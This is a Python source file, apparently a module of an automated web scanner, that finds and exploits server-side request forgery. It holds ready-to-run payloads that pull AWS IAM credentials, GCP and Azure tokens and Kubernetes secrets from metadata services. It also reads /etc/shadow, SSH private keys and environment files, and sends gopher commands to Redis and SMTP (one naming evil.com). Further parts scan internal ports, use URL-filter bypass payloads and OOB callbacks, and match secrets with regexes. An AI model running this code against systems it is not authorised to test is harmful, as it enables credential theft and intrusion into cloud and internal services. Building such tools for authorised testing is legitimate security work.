"""
Advanced SSRF Detection & Exploitation Module
1. Cloud metadata (AWS/GCP/Azure/DO/K8s/Alibaba/Oracle) with deep credential extraction
2. Internal network scan (25 ports)  3. File/Gopher/Dict/LDAP protocol smuggling
4. Blind SSRF via OOB callbacks  5. Timing-based blind SSRF  6. URL parser confusion bypasses
"""
import asyncio
import re
import json
import logging
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote

import httpx
from app.utils.http_client import make_client

logger = logging.getLogger(__name__)

# Cloud metadata endpoints with deep extraction paths
CLOUD_METADATA = {
    "aws": {
        "url": "http://169.254.169.254/latest/meta-data/",
        "indicators": ["ami-id", "instance-id", "instance-type", "local-hostname"],
        "critical_paths": [
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/user-data",
            "http://169.254.169.254/latest/meta-data/iam/info",
            "http://169.254.169.254/latest/meta-data/hostname",
            "http://169.254.169.254/latest/meta-data/local-ipv4",
            "http://169.254.169.254/latest/meta-data/public-keys/",
            "http://169.254.169.254/latest/dynamic/instance-identity/document",
        ],
    },
    "gcp": {
        "url": "http://metadata.google.internal/computeMetadata/v1/",
        "headers": {"Metadata-Flavor": "Google"},
        "indicators": ["project-id", "instance/zone", "attributes"],
        "critical_paths": [
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            "http://metadata.google.internal/computeMetadata/v1/project/project-id",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email",
            "http://metadata.google.internal/computeMetadata/v1/instance/attributes/",
            "http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/0/access-configs/0/external-ip",
        ],
    },
    "azure": {
        "url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "headers": {"Metadata": "true"},
        "indicators": ["compute", "vmId", "subscriptionId"],
        "critical_paths": [
            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
            "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&format=text",
        ],
    },
    "digitalocean": {
        "url": "http://169.254.169.254/metadata/v1/",
        "indicators": ["droplet_id", "hostname", "region"],
        "critical_paths": ["http://169.254.169.254/metadata/v1/user-data"],
    },
    "kubernetes": {
        "url": "https://kubernetes.default.svc.cluster.local/",
        "indicators": ["apiVersion", "kind", "metadata", "items"],
        "critical_paths": [
            "https://kubernetes.default.svc.cluster.local/api/v1/namespaces/default/secrets",
            "https://kubernetes.default.svc.cluster.local/api/v1/namespaces/kube-system/secrets",
        ],
    },
    "alibaba": {
        "url": "http://100.100.100.200/latest/meta-data/",
        "indicators": ["instance-id", "region-id", "image-id"],
        "critical_paths": ["http://100.100.100.200/latest/meta-data/ram/security-credentials/"],
    },
    "oracle": {
        "url": "http://169.254.169.254/opc/v2/instance/",
        "indicators": ["compartmentId", "shape", "region"],
        "critical_paths": ["http://169.254.169.254/opc/v1/identity/key.pem"],
    },
}

# Internal network — expanded port coverage
INTERNAL_TARGETS = [
    ("127.0.0.1", [21, 22, 25, 80, 443, 2375, 3000, 3306, 4443, 5000, 5432, 5672, 6379, 8080, 8443, 8500, 9000, 9092, 9200, 10250, 11211, 15672, 27017]),
    ("localhost", [80, 3000, 3306, 5432, 6379, 8080, 9200, 27017]),
    ("10.0.0.1", [80, 443, 8080, 8443, 3306, 5432]),
    ("172.17.0.1", [80, 2375, 2376, 8080, 9200]),
    ("172.17.0.2", [80, 3000, 5000, 8080]),
    ("192.168.1.1", [80, 443, 8080]),
    ("0.0.0.0", [80]),
]

PORT_SERVICES = {
    21: "FTP", 22: "SSH", 25: "SMTP", 80: "HTTP", 443: "HTTPS", 2375: "Docker API",
    2376: "Docker TLS", 3000: "Node/Dev", 3306: "MySQL", 4443: "Kubernetes API",
    5000: "Flask/Dev", 5432: "PostgreSQL", 5672: "RabbitMQ", 6379: "Redis",
    8080: "HTTP Proxy", 8443: "Alt HTTPS", 8500: "Consul", 9000: "PHP-FPM/Minio",
    9092: "Kafka", 9200: "Elasticsearch", 10250: "Kubelet", 11211: "Memcached",
    15672: "RabbitMQ Mgmt", 27017: "MongoDB",
}

# File protocol payloads
FILE_PAYLOADS = [
    ("file:///etc/passwd", "file_read", ["root:", "bin:", "daemon:"]),
    ("file:///etc/shadow", "shadow_file", ["root:"]),
    ("file:///proc/self/environ", "env_leak", ["PATH=", "HOME=", "SECRET", "PASSWORD", "KEY"]),
    ("file:///proc/self/cmdline", "process_info", []),
    ("file:///proc/self/cwd/.env", "env_file", ["SECRET", "DATABASE", "API_KEY", "PASSWORD"]),
    ("file:///proc/self/cwd/config.py", "source_code", ["SECRET", "DATABASE", "PASSWORD"]),
    ("file:///proc/self/cwd/config/database.yml", "db_config", ["password", "host"]),
    ("file:///root/.ssh/id_rsa", "ssh_key", ["PRIVATE KEY"]),
    ("file:///home/*/.ssh/id_rsa", "ssh_key", ["PRIVATE KEY"]),
    ("file:///var/run/secrets/kubernetes.io/serviceaccount/token", "k8s_token", ["eyJ"]),
    ("file:///proc/net/tcp", "network_info", ["local_address"]),
    ("file:///etc/nginx/nginx.conf", "nginx_conf", ["server", "location", "proxy_pass"]),
    ("file:///proc/self/cwd/package.json", "package_json", ["dependencies", "scripts"]),
    ("file:///root/.bash_history", "bash_history", []),
    ("file:///etc/hostname", "hostname", []),
]

# Gopher/Dict/LDAP protocol smuggling
GOPHER_PAYLOADS = [
    ("gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aSET%0d%0a$3%0d%0apwn%0d%0a$4%0d%0ahack%0d%0a", "redis_cmd", "Redis SET via gopher"),
    ("gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aINFO%0d%0a", "redis_info", "Redis INFO via gopher"),
    ("gopher://127.0.0.1:25/_MAIL%20FROM:<a@evil.com>%0d%0aRCPT%20TO:<admin@target.com>%0d%0aDATA%0d%0aSubject:%20SSRF%0d%0a%0d%0aPWNED%0d%0a.%0d%0a", "smtp_relay", "SMTP relay via gopher"),
]
DICT_PAYLOADS = [
    ("dict://127.0.0.1:6379/INFO", "redis", "Redis INFO via dict"),
    ("dict://127.0.0.1:11211/stats", "memcached", "Memcached stats via dict"),
]
LDAP_PAYLOADS = [
    ("ldap://127.0.0.1:389/dc=example,dc=com", "ldap", "LDAP probe"),
]

# URL bypass / parser confusion
URL_BYPASS_PAYLOADS = [
    ("http://0x7f000001/", "hex_ip"), ("http://2130706433/", "decimal_ip"),
    ("http://017700000001/", "octal_ip"), ("http://127.1/", "short_ip"),
    ("http://0/", "zero_ip"), ("http://[::1]/", "ipv6_loopback"),
    ("http://[::ffff:127.0.0.1]/", "ipv6_mapped_v4"),
    ("http://[0:0:0:0:0:ffff:127.0.0.1]/", "ipv6_mapped_v4_full"),
    ("http://%31%32%37%2e%30%2e%30%2e%31/", "url_encoded"),
    ("http://127.0.0.1:80@evil.com/", "url_authority_confusion"),
    ("http://evil.com#@127.0.0.1/", "url_fragment_confusion"),
    ("http://127.0.0.1%00@evil.com/", "null_byte"),
    ("http://127.0.0.1%2523@evil.com/", "double_encoded_hash"),
    ("http://127.0.0.1.nip.io/", "dns_wildcard_nip"),
    ("http://localtest.me/", "dns_rebind_localtest"),
    ("http://spoofed.burpcollaborator.net/", "dns_rebind_burp"),
    ("http://0177.0.0.1/", "octal_partial"),
    ("http://0x7f.0.0.1/", "hex_partial"),
    ("http://127.0.1/", "class_b_short"),
]

# Timing-based blind SSRF targets (non-responsive internal IPs)
TIMING_TARGETS = [
    "http://10.0.0.1:65535/", "http://10.255.255.1:1/",
    "http://192.168.1.254:65535/", "http://172.16.0.1:65535/",
    "http://192.0.2.1/", "http://198.51.100.1/",
]


class SSRFModule:
    def __init__(self, rate_limit: asyncio.Semaphore = None):
        self.rate_limit = rate_limit or asyncio.Semaphore(5)

    async def check(self, context: dict, db) -> list[dict]:
        endpoints = context.get("endpoints", [])
        base_url = context.get("base_url", "")
        auth_cookie = context.get("auth_cookie")
        scan_id = context.get("scan_id", "")
        findings = []

        url_params = self._find_url_params(endpoints, base_url)
        if not url_params:
            return findings
        logger.info(f"SSRF: Found {len(url_params)} URL-accepting endpoints to test")

        headers = {}
        if auth_cookie:
            if auth_cookie.startswith("token="):
                headers["Authorization"] = f"Bearer {auth_cookie.split('=', 1)[1]}"
            else:
                headers["Cookie"] = auth_cookie

        async with make_client(extra_headers=headers) as client:
            for ep_info in url_params[:12]:
                url, param, method = ep_info["url"], ep_info["param"], ep_info.get("method", "GET")
                findings.extend(await self._check_cloud_metadata(client, url, param, method))
                findings.extend(await self._check_internal_network(client, url, param, method))
                findings.extend(await self._check_file_protocol(client, url, param, method))
                findings.extend(await self._check_protocol_smuggling(client, url, param, method))
                findings.extend(await self._check_url_bypasses(client, url, param, method))
                findings.extend(await self._check_blind_oob(client, url, param, method, scan_id))
                findings.extend(await self._check_timing_blind(client, url, param, method))
        return findings

    def _find_url_params(self, endpoints, base_url) -> list[dict]:
        url_params = []
        url_param_names = {
            "url", "uri", "path", "redirect", "next", "target", "dest", "destination",
            "redir", "redirect_uri", "callback", "return", "returnto", "go", "checkout_url",
            "continue", "view", "page", "file", "document", "folder", "load", "img", "image",
            "src", "feed", "host", "site", "html", "ref", "data", "link", "fetch", "proxy",
            "request", "download", "source", "content", "to", "out", "domain", "resource", "val",
        }
        for ep in endpoints:
            if isinstance(ep, str):
                parsed = urlparse(ep)
                if parsed.query:
                    params = parse_qs(parsed.query)
                    for pname in params:
                        if pname.lower() in url_param_names:
                            url_params.append({"url": ep, "param": pname, "method": "GET"})
                        val = params[pname][0] if params[pname] else ""
                        if val.startswith(("http://", "https://", "//", "/")):
                            url_params.append({"url": ep, "param": pname, "method": "GET"})
            elif isinstance(ep, dict):
                ep_url = ep.get("url", "")
                for field in ep.get("form_fields", []):
                    fname = field if isinstance(field, str) else field.get("name", "")
                    if fname.lower() in url_param_names:
                        url_params.append({"url": ep_url, "param": fname, "method": ep.get("method", "GET")})
        seen = set()
        return [p for p in url_params if (k := f"{p['url']}|{p['param']}|{p['method']}") not in seen and not seen.add(k)]

    async def _check_cloud_metadata(self, client, url, param, method) -> list[dict]:
        findings = []
        for cloud, config in CLOUD_METADATA.items():
            try:
                async with self.rate_limit:
                    resp = await self._send(client, url, param, config["url"], method)
                    if not resp or resp.status_code != 200:
                        continue
                    body = resp.text
                    if not any(ind in body for ind in config["indicators"]):
                        continue
                    logger.info(f"SSRF: Cloud metadata ({cloud}) via {url} param={param}")

                    critical_data = {}
                    for cpath in config.get("critical_paths", []):
                        try:
                            async with self.rate_limit:
                                cr = await self._send(client, url, param, cpath, method)
                                if cr and cr.status_code == 200 and len(cr.text) > 5:
                                    critical_data[cpath] = cr.text[:4096]
                                    # AWS IAM: fetch actual creds if we got role list
                                    if "iam/security-credentials/" in cpath and cr.text.strip():
                                        role = cr.text.strip().split("\n")[0]
                                        async with self.rate_limit:
                                            cr2 = await self._send(client, url, param, f"{cpath}{role}", method)
                                            if cr2 and cr2.status_code == 200:
                                                critical_data[f"IAM Creds ({role})"] = cr2.text[:4096]
                        except Exception:
                            continue

                    has_creds = any(kw in str(critical_data).lower() for kw in [
                        "accesskeyid", "secretaccesskey", "token", "password", "private_key", "access_token"])
                    findings.append({
                        "title": f"SSRF - {cloud.upper()} Cloud Metadata Exposed",
                        "url": url, "param": param, "severity": "critical", "vuln_type": "ssrf",
                        "cloud_provider": cloud, "metadata_response": body[:2048],
                        "critical_data": critical_data, "credentials_found": has_creds,
                        "impact": f"Full {cloud.upper()} metadata access." + (" IAM credentials extracted." if has_creds else ""),
                        "remediation": "Block metadata endpoints. Use IMDSv2 (AWS) or equivalent.",
                    })
            except Exception:
                continue
        return findings

    async def _check_internal_network(self, client, url, param, method) -> list[dict]:
        findings = []
        try:
            async with self.rate_limit:
                bl = await self._send(client, url, param, "http://example.com", method)
                bl_text = bl.text if bl else ""
                bl_len = len(bl_text)
        except Exception:
            bl_text, bl_len = "", 0

        for host, ports in INTERNAL_TARGETS:
            for port in ports:
                try:
                    async with self.rate_limit:
                        resp = await self._send(client, url, param, f"http://{host}:{port}/", method)
                        if not resp or resp.status_code not in (200, 301, 302, 401, 403) or len(resp.text) < 20:
                            continue
                        if resp.text == bl_text or (abs(len(resp.text) - bl_len) < 20 and resp.text[:100] == bl_text[:100]):
                            continue
                        service = self._identify_service(resp.text, port)
                        is_critical = port in (2375, 6379, 9200, 27017, 3306, 5432)
                        findings.append({
                            "title": f"SSRF - Internal Service: {host}:{port} ({service})",
                            "url": url, "param": param, "severity": "critical" if is_critical else "high",
                            "vuln_type": "ssrf", "internal_target": f"{host}:{port}", "service": service,
                            "response_preview": resp.text[:500],
                            "impact": f"Internal {service} at {host}:{port} accessible via SSRF."
                                      + (" Docker API = full RCE." if port == 2375 else ""),
                        })
                except Exception:
                    continue
        return findings

    async def _check_file_protocol(self, client, url, param, method) -> list[dict]:
        findings = []
        for payload, check_type, indicators in FILE_PAYLOADS:
            try:
                async with self.rate_limit:
                    resp = await self._send(client, url, param, payload, method)
                    if not resp or resp.status_code != 200:
                        continue
                    body = resp.text
                    if not (any(ind in body for ind in indicators) if indicators else len(body) > 20):
                        continue
                    secrets = self._extract_secrets(body)
                    findings.append({
                        "title": f"SSRF - File Read ({check_type}): {payload.split('/')[-1]}",
                        "url": url, "param": param,
                        "severity": "critical" if check_type in ("ssh_key", "shadow_file", "env_leak", "env_file", "k8s_token") or secrets else "high",
                        "vuln_type": "ssrf", "protocol": "file", "payload": payload,
                        "response_preview": body[:2048], "secrets_found": secrets,
                        "impact": f"File read via file://." + (f" Secrets: {', '.join(secrets[:5])}." if secrets else ""),
                    })
            except Exception:
                continue
        return findings

    async def _check_protocol_smuggling(self, client, url, param, method) -> list[dict]:
        findings = []
        for payloads, proto, sev in [(GOPHER_PAYLOADS, "gopher", "critical"),
                                      (DICT_PAYLOADS, "dict", "high"),
                                      (LDAP_PAYLOADS, "ldap", "high")]:
            for payload, target_svc, desc in payloads:
                try:
                    async with self.rate_limit:
                        resp = await self._send(client, url, param, payload, method)
                        if resp and resp.status_code == 200 and len(resp.text) > 10:
                            findings.append({
                                "title": f"SSRF - {proto.upper()} Protocol ({target_svc})",
                                "url": url, "param": param, "severity": sev, "vuln_type": "ssrf",
                                "protocol": proto, "payload": payload, "description": desc,
                                "response_preview": resp.text[:500],
                                "impact": f"{desc}. {proto.upper()} allows arbitrary TCP interaction.",
                            })
                except Exception:
                    continue
        return findings

    async def _check_url_bypasses(self, client, url, param, method) -> list[dict]:
        findings = []
        try:
            async with self.rate_limit:
                basic = await self._send(client, url, param, "http://127.0.0.1/", method)
                if basic and basic.status_code == 200 and len(basic.text) > 50:
                    return []
        except Exception:
            pass
        for payload, technique in URL_BYPASS_PAYLOADS:
            try:
                async with self.rate_limit:
                    resp = await self._send(client, url, param, payload, method)
                    if resp and resp.status_code == 200 and len(resp.text) > 50:
                        findings.append({
                            "title": f"SSRF Filter Bypass ({technique})",
                            "url": url, "param": param, "severity": "high", "vuln_type": "ssrf",
                            "bypass_technique": technique, "payload": payload,
                            "response_preview": resp.text[:300],
                            "impact": f"SSRF protection bypassed via {technique}.",
                        })
            except Exception:
                continue
        return findings

    async def _check_blind_oob(self, client, url, param, method, scan_id) -> list[dict]:
        findings = []
        try:
            from app.modules.oob_server import OOBManager, OOB_HOST
            if not OOB_HOST:
                return findings
            mgr = OOBManager()
            oob_payloads = []
            for style in ("direct_http", "http_with_path", "dns_callback"):
                token = mgr.generate_token(scan_id or "ssrf-check", "ssrf", url)
                if style == "dns_callback":
                    payload = f"http://{mgr.get_dns_hostname(token)}/"
                elif style == "http_with_path":
                    payload = f"{mgr.get_callback_url(token)}/ssrf-probe"
                else:
                    payload = mgr.get_callback_url(token)
                oob_payloads.append((payload, token, style))

            for payload, token, style in oob_payloads:
                try:
                    async with self.rate_limit:
                        await self._send(client, url, param, payload, method)
                except Exception:
                    continue

            await asyncio.sleep(3)

            for payload, token, style in oob_payloads:
                try:
                    raw = mgr._redis.get(f"phantom:oob:{token}")
                    if not raw:
                        continue
                    data = json.loads(raw)
                    if data.get("triggered"):
                        findings.append({
                            "title": f"Blind SSRF Confirmed (OOB {style})",
                            "url": url, "param": param, "severity": "high", "vuln_type": "ssrf",
                            "blind": True, "oob_style": style, "oob_token": token,
                            "callback_from": data.get("source_ip", "unknown"),
                            "impact": "Blind SSRF confirmed via OOB callback. Server makes outbound requests to attacker URLs.",
                            "remediation": "Implement URL allowlist. Block outbound to internal/metadata IPs.",
                        })
                except Exception:
                    continue
        except ImportError:
            pass
        except Exception as e:
            logger.debug(f"Blind OOB SSRF error: {e}")
        return findings

    async def _check_timing_blind(self, client, url, param, method) -> list[dict]:
        findings = []
        baseline_times = []
        for _ in range(3):
            try:
                async with self.rate_limit:
                    t0 = time.monotonic()
                    await self._send(client, url, param, "http://example.com/", method)
                    baseline_times.append(time.monotonic() - t0)
            except Exception:
                baseline_times.append(0.5)
        if not baseline_times:
            return findings
        avg_bl = sum(baseline_times) / len(baseline_times)
        threshold = max(2.5, avg_bl * 3)

        for target in TIMING_TARGETS:
            try:
                async with self.rate_limit:
                    t0 = time.monotonic()
                    await self._send(client, url, param, target, method)
                    elapsed = time.monotonic() - t0
                    if elapsed > threshold and elapsed > max(baseline_times) * 2:
                        findings.append({
                            "title": f"Blind SSRF (Timing): {urlparse(target).netloc}",
                            "url": url, "param": param, "severity": "medium", "vuln_type": "ssrf",
                            "blind": True, "detection": "timing", "payload": target,
                            "baseline_avg": round(avg_bl, 2), "measured_time": round(elapsed, 2),
                            "impact": f"Timing blind SSRF: {elapsed:.1f}s vs baseline {avg_bl:.1f}s when targeting internal IP.",
                            "remediation": "Implement URL allowlist. Set strict outbound timeouts.",
                        })
                        break
            except Exception:
                continue
        return findings

    async def _send(self, client, url, param, payload, method) -> httpx.Response | None:
        try:
            if method.upper() == "GET":
                parsed = urlparse(url)
                params = parse_qs(parsed.query, keep_blank_values=True)
                params[param] = [payload]
                flat = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
                return await client.get(urlunparse(parsed._replace(query=urlencode(flat))), timeout=8.0)
            else:
                return await client.post(url, data={param: payload}, timeout=8.0)
        except httpx.TimeoutException:
            return None
        except Exception:
            return None

    def _identify_service(self, body: str, port: int) -> str:
        bl = body.lower()
        checks = [
            ("redis_version", "Redis"), ("+pong", "Redis"), ('"cluster_name"', "Elasticsearch"),
            ('"tagline"', "Elasticsearch"), ("mongodb", "MongoDB"), ('"ismaster"', "MongoDB"),
            ("docker", "Docker API"), ('"containers"', "Docker API"), ("mysql", "MySQL"),
            ("mariadb", "MySQL"), ("postgresql", "PostgreSQL"), ("rabbitmq", "RabbitMQ"),
            ("memcached", "Memcached"), ("consul", "Consul"), ("kafka", "Kafka"),
            ("kubelet", "Kubernetes"), ("kubernetes", "Kubernetes"),
        ]
        for pattern, name in checks:
            if pattern in bl:
                return name
        if "<html" in bl:
            return "HTTP"
        return PORT_SERVICES.get(port, f"port-{port}")

    def _extract_secrets(self, text: str) -> list[str]:
        secrets = []
        for pattern, label in [
            (r'(?:AWS_?ACCESS_?KEY_?ID|aws_access_key_id)\s*[=:]\s*["\']?(AK[A-Z0-9]{18,})', "AWS Access Key"),
            (r'(?:AWS_?SECRET|aws_secret_access_key)\s*[=:]\s*["\']?([A-Za-z0-9/+=]{36,})', "AWS Secret Key"),
            (r'(?:DATABASE_URL|DB_URL)\s*[=:]\s*["\']?([^\s"\']+)', "Database URL"),
            (r'(?:PASSWORD|PASSWD|DB_PASS)\s*[=:]\s*["\']?([^\s"\']{4,})', "Password"),
            (r'(?:SECRET_KEY|JWT_SECRET|APP_SECRET)\s*[=:]\s*["\']?([^\s"\']{8,})', "Secret Key"),
            (r'(?:API_KEY|APIKEY)\s*[=:]\s*["\']?([^\s"\']{8,})', "API Key"),
            (r'(?:PRIVATE.KEY|-----BEGIN [A-Z]+ PRIVATE KEY-----)', "Private Key"),
            (r'(ghp_[A-Za-z0-9]{36,})', "GitHub PAT"),
            (r'(sk-[A-Za-z0-9]{32,})', "Stripe/OpenAI Key"),
            (r'(xox[bpsa]-[A-Za-z0-9-]+)', "Slack Token"),
        ]:
            if re.search(pattern, text, re.IGNORECASE):
                secrets.append(label)
        return secrets
